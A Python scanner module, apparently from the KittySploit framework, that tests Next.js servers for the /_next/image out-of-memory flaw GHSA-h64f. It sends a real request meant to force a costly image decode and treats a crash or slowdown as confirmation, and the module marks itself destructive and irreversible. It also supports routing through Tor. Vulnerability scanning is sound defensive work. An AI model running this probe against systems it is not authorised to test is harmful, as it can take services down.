#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import time
from urllib.parse import quote

import requests

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.nextjs_probe import ensure_nextjs_target


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Next.js /_next/image OOM (GHSA-h64f) — detect",
        "description": (
            "Streams GET /_next/image?url=…&w=&q=; flags slow 200, 5xx, or errors as vulnerable; "
            "fast 400/413/415 as mitigated."
        ),
        "author": ["KittySploit Team"],
        "severity": "high",
        "references": ["https://github.com/advisories/GHSA-h64f-5h5j-jqjh"],
        "tags": ["scanner", "http", "nextjs", "dos", "image", "oom"],
    'agent': {
        'risk': 'destructive',
        'effects': ['target_modification'],
        'expected_requests': 2,
        'reversible': False,
        'approval_required': True,
        'produces': ['tech_hints', 'risk_signals', 'endpoints'],
    },
    }

    image_asset_path = OptString("/large.bin", "url= query path to large asset", required=False)
    image_width = OptInteger(16, "w=", required=False)
    image_quality = OptInteger(1, "q=", required=False)
    image_timeout = OptInteger(120, "Read timeout (seconds)", required=False, advanced=True)

    def _o(self, opt):
        if hasattr(opt, "value"):
            return opt.value
        if hasattr(opt, "__get__"):
            try:
                return opt.__get__(self, type(self))
            except Exception:
                pass
        return opt

    def _root(self):
        t, p = str(self._o(self.target) or "").strip(), int(self._o(self.port))
        proto = "https" if self._to_bool(self._o(self.ssl)) else "http"
        return f"{proto}://{t}:{p}".rstrip("/")

    def _image_url(self):
        ap = str(self._o(self.image_asset_path) or "/large.bin").strip() or "/large.bin"
        if not ap.startswith("/"):
            ap = "/" + ap
        w = int(self._o(self.image_width))
        q = int(self._o(self.image_quality))
        return f"{self._root()}/_next/image?url={quote(ap, safe='')}&w={w}&q={q}"

    def _verify_proxies(self):
        verify = self._to_bool(self._o(self.verify_ssl))
        px = str(self._o(self.proxy) or "").strip()
        proxies = {}
        if px:
            proxies = {"http": px, "https": px}
        elif self.framework and getattr(self.framework, "is_tor_enabled", lambda: False)():
            tor = self.framework.tor_manager.get_tor_proxy_dict()
            if tor:
                proxies = tor
        elif self.framework and getattr(self.framework, "is_proxy_enabled", lambda: False)():
            u = self.framework.get_proxy_url()
            if u:
                proxies = {"http": u, "https": u, "all": u}
        return verify, proxies or None

    def _stream_get(self):
        url = self._image_url()
        verify, proxies = self._verify_proxies()
        self._configure_session()
        t0 = time.perf_counter()
        code = -1
        nbytes = 0
        err = None
        try:
            r = self.session.get(
                url,
                timeout=int(self._o(self.image_timeout)),
                verify=verify,
                proxies=proxies or None,
                stream=True,
            )
            code = r.status_code
            for chunk in r.iter_content(64 * 1024):
                if chunk:
                    nbytes += len(chunk)
            r.close()
        except requests.RequestException as e:
            err = str(e)
        return code, nbytes, time.perf_counter() - t0, err

    def run(self):
        if not ensure_nextjs_target(self):
            return False
        code, nbytes, wall, err = self._stream_get()
        if err or code in (500, 502, 503, 504):
            self.set_info(reason="crash/OOM/5xx or transport error", http=code, bytes_read=nbytes, wall=round(wall, 2))
            return True
        if code == 200 and wall > 5.0:
            self.set_info(reason="slow 200 (full decode?)", bytes_read=nbytes, wall=round(wall, 2))
            return True
        if code in (400, 413, 415) and wall < 3.0:
            self.set_info(reason="fast rejection", http=code, wall=round(wall, 2))
            return False
        self.set_info(reason="inconclusive", http=code, wall=round(wall, 2), bytes_read=nbytes)
        return False
